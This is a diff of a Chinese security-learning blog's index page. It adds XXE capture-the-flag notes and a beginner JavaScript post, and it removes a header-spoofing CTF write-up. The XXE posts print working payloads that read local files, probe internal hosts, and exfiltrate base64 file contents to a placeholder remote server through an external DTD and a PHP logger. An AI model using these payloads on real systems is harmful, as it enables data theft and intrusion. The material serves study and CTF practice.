@@ -64,9 +64,126 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-xxe解题三方面" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xxe漏洞2" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/" class="article-date">
+    <a href="/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/" class="article-date">
+  <time datetime="2022-09-04T08:40:48.000Z" itemprop="datePublished">2022-09-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/xxe/">xxe</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/">xxe漏洞2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>继续xxe的学习，今天的靶场是来自于ctfshow的web373</p>
+<p>打开靶场，发现如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 允许加载外部实体</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// xml文件来源于数据流</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">  	<span class="comment">// 加载xml实体，参数为替代实体、加载外部子集</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  	<span class="comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">  	<span class="comment">// 节点嵌套</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>火狐直接post传入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE am [</span><br><span class="line"> &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;admin;&lt;/ctfshow&gt;           &lt;!--上面的节点转换和节点嵌套定义了xml的标签--&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/" data-id="cl7oqqg4w00021kdqbvpy6wkt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-js学习笔记（一）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/09/04/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2022-09-04T01:46:46.000Z" itemprop="datePublished">2022-09-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/js/">js</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/09/04/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">js学习笔记（一）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h3 id="一：浏览器执行js过程"><a href="#一：浏览器执行js过程" class="headerlink" title="一：浏览器执行js过程"></a>一：浏览器执行js过程</h3><p>浏览器本身不会执行js代码，通过内置JavaScript引擎（解释器）来解释，引擎解释代码时逐行解释，将每一句源码转换成机器语言，再由计算机执行过后，再解释下一句。所以js语言被归为脚本语言</p>
+<h3 id="二：初识js"><a href="#二：初识js" class="headerlink" title="二：初识js"></a>二：初识js</h3><h4 id="1-js组成的三部分"><a href="#1-js组成的三部分" class="headerlink" title="1). js组成的三部分"></a>1). js组成的三部分</h4><p>1.ECMAScript（js语法）                     基础</p>
+<p>2.DOM（页面文档对象模型）：通过dom提供的api操作页面内的各种元素                                    拓展</p>
+<p>3.BOM（浏览器对象模型）：通过bom可以操作浏览器串口，比如弹出框，获取分辨率               拓展</p>
+<h4 id="2-js的书写位置"><a href="#2-js的书写位置" class="headerlink" title="2). js的书写位置"></a>2). js的书写位置</h4><p>1.行内</p>
+<p>可以将单行或少量js代码写在html标签的时间属性中（on开头的属性，比如onclick）</p>
+<p>特殊情况使用</p>
+<p>2.内嵌</p>
+<p>3.外部</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>js学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 2.内嵌式的js--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;1111&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 3.外部式js--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;1111.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--1.行内式的js 直接写到元素内部--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;唐伯虎&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;秋香&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-注释"><a href="#3-注释" class="headerlink" title="3). 注释"></a>3). 注释</h4><p>单行：//</p>
+<p>多行：/*   */</p>
+<h4 id="4-输入输出语句"><a href="#4-输入输出语句" class="headerlink" title="4). 输入输出语句"></a>4). 输入输出语句</h4><p>alert（）：浏览器弹出警示框</p>
+<p>console.log（）：浏览器控制台打印输出信息</p>
+<p>prompt（）：浏览器弹出输入框，用户输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>js学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 输入框</span></span></span><br><span class="line"><span class="language-javascript">       <span class="title function_">prompt</span>(<span class="string">&#x27;请输入你的学号&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 弹出警示框，展示给用户</span></span></span><br><span class="line"><span class="language-javascript">       <span class="title function_">alert</span>(<span class="string">&#x27;aaa&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 控制台输出，给程序员测试用</span></span></span><br><span class="line"><span class="language-javascript">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;程序员能看的&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输入输出的连接符用+，例如</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>js学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> myname = <span class="string">&#x27;旗木卡卡西&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> myage = <span class="string">&#x27;21&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> myemail = <span class="string">&#x27;123&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> myadress = <span class="string">&#x27;火影村&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> mygz = <span class="string">&#x27;3000&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;我叫&#x27;</span>+myname+<span class="string">&#x27;，&#x27;</span>+<span class="string">&#x27;我住在&#x27;</span>+myadress+<span class="string">&#x27;，&#x27;</span>+<span class="string">&#x27;我今年&#x27;</span>+myage+<span class="string">&#x27;，&#x27;</span>+<span class="string">&#x27;我的邮箱是&#x27;</span>+myemail+<span class="string">&#x27;，&#x27;</span>+<span class="string">&#x27;我的工资&#x27;</span>+mygz);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5-变量类型"><a href="#5-变量类型" class="headerlink" title="5). 变量类型"></a>5). 变量类型</h4><p>js的变量类型只有在程序的运行过程中，根据变量的值来确定</p>
+<p>var：不确定属于那种数据类型，根据后面的值来判断</p>
+<p>number： 在数字面前加0表示八进制，加0x表示16进制</p>
+<p>var num = 010，转换为十进制就是8</p>
+<p>var num = 0x9 转换为十进制就是9</p>
+<p>字符串转义字符</p>
+<p>\开头        \n  换行</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/04/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="cl7oqqg4m00001kdq7y5y4a3t" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-xxe解题合集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/" class="article-date">
   <time datetime="2022-09-03T10:20:55.000Z" itemprop="datePublished">2022-09-03</time>
 </a>
     
@@ -82,7 +199,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/">xxe解题三方面</a>
+      <a class="article-title" href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/">xxe解题三方面</a>
     </h1>
   
 
@@ -101,11 +218,33 @@
 <p>借助漏洞实现内网探测，payload如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.199.100:80&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>4.引用外部实体读取文件，文件里面包含&lt;&gt;&amp;等不符合xml规范的字符时，可以用CDATA，CDATA可以将里面包含的内容不经过解析引擎解析，因为这个特殊性质，所以在dtd使用cdata的时候要将它拆分，而且因为外部实体引用不支持多个实体连续引用，所以需要用到参数实体，像如下这样构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先%dtd调用，请求了<a target="_blank" rel="noopener" href="http://ip/evil.dtd%EF%BC%8C%E8%BF%99%E4%B8%AAdtd%E9%87%8C%E9%9D%A2%E5%B0%86%start;%goodies;%end%E7%9A%84%E5%80%BC%E9%83%BD%E8%B0%83%E7%94%A8%EF%BC%8C%E8%B5%8B%E7%BB%99%E4%BA%86all%EF%BC%8C%E4%B8%8B%E9%9D%A2%E7%9A%84&amp;all%E5%8F%98%E9%87%8F%E5%B0%B1%E8%83%BD%E6%98%BE%E7%A4%BA%E5%87%BA%E7%BB%93%E6%9E%9C%E4%BA%86">http://ip/evil.dtd，这个dtd里面将%start;%goodies;%end的值都调用，赋给了all，下面的&amp;all变量就能显示出结果了</a></p>
+<p>5.无回显读取本地敏感文件</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>test.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip/xxe.php?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p>上面那是大佬写的，我自己的理解就是</p>
+<p>%remote就是调用% remote的替换值，现在已经打开了test.dtd这个文件，然后%int就调用了% int的替换值，也就是<!ENTITY &#37; send SYSTEM 'http://ip:9999?p=%file;'>，因为send的值已经是最后要显示出来的结果了，所以就不能有%，所以将他转成实体编码，最后的%send就调用了% send的值，也就是<a target="_blank" rel="noopener" href="http://ip:9999/?p=%25file%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%88%E4%BC%A0%E5%85%A5%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%25file%EF%BC%8C%25file%E5%8F%88%E8%B0%83%E7%94%A8%E4%BA%86%25">http://ip:9999?p=%file，这里又传入了一个参数%file，%file又调用了%</a> file的值，php://filter/read=convert.base64-encode/resource=file:///D:/test.txt页面所显示的结果就是p的值</p>
+<p>这整个过程就是一个服务器向另一个服务器发起请求，相当于另类的ssrf</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/" data-id="cl7lrb5wh0000ik0q1grt127d" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/" data-id="cl7oqqg4x00031kdq92s43gdp" class="article-share-link">Share</a>
       
       
     </footer>
@@ -265,12 +404,27 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p><em>参数实体</em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;值&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>or</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p><code>%name</code>(参数实体)是在DTD中被引用的，而<code>&amp;name;</code>是在xml文档中被引用的</p>
+<p><code>% name</code>(参数实体)是在DTD中被引用的，而<code>&amp;name;</code>是在xml文档中被引用的</p>
+<p>参数实体声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % peopleParameters &quot;age CDATA #IMPLIED weight CDATA #IMPLIED height CDATA #REQUIRED&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参数实体声明由以下几部分组成：<strong>ENTITY关键字、百分号、名称和替换值</strong></p>
+<p>上面的置换文本是属性列表声明的一部分，它包含三个普通属性。当解析器处理上述语句时，它会用这三个属性取代<strong>参数实体</strong>名称。如果我们需要在DTD输入该属性集合，只需引用实体perpleParameters即可</p>
+<p>参数实体引用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST InsuredPerson %peopleParameters; carrier CDATA #REQUIRED &gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>引用参数实体时</strong>，需要在实体名称之前增加百分号，在其后增加分号。定界符与名称之间没有空格.</p>
+<p> 上面代码声明InsurePerson元素包含4个属性：其中carrier是显式声明的，其余三个参数(age、weight和height)包含在参数实体中，当解析器用置换文本取代实体引用时，会出现元素的完整列表。因此，上面的例子等价于下面的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST InsuredPerson</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">                        age CDATA #IMPLIED</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">                        weight CDATA #IMPLIED</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">                        height CDATA #REQUIRED</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">                        carrier CDATA #REQUIRED&gt;</span><br></pre></td></tr></table></figure>
+
+<p>  与通用实体类似，参数实体的置换文本也可以位于外部文件中。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %myParm SYSTEM &quot;HTTP://WWW.GOOTRY.COM&quot;&gt; </span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -565,48 +719,12 @@
 
 
   
-    <article id="post-http" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/08/25/http/" class="article-date">
-  <time datetime="2022-08-25T07:58:14.000Z" itemprop="datePublished">2022-08-25</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/http/">http</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/08/25/http/">http请求报文首部</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>首先先打开buu的http<br>打开环境，没发现东西，那就浏览源码，搜索php，发现了Secret.php，那就在url上打开<br>页面上显示不是从<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn打开的,那就抓包,在请求报文首部添加字段/">https://Sycsecret.buuoj.cn打开的，那就抓包，在请求报文首部添加字段</a><br>Referer：(服务器伪造)<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a><br>然后页面显示要用Syclover browser，所以要伪造浏览器，就把User-Agent的浏览器字符改成Syclover browser<br>然后页面显示读取这个需要本地读取，所以再添加字段X-Forwarded-For:(用于修改ip),将其值改为127.0.0.1<br>最后发送页面，得到了flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/25/http/" data-id="cl7gcvvon0000ks0qcfkbduff" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -616,7 +734,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/unserialize/">unserialize</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/xxe/">xxe</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/js/">js</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/unserialize/">unserialize</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/xxe/">xxe</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li></ul>
     </div>
   </div>
 
@@ -644,7 +762,15 @@
       <ul>
         
           <li>
-            <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E4%B8%89%E6%96%B9%E9%9D%A2/">xxe解题三方面</a>
+            <a href="/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/">xxe漏洞2</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/04/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">js学习笔记（一）</a>
+          </li>
+        
+          <li>
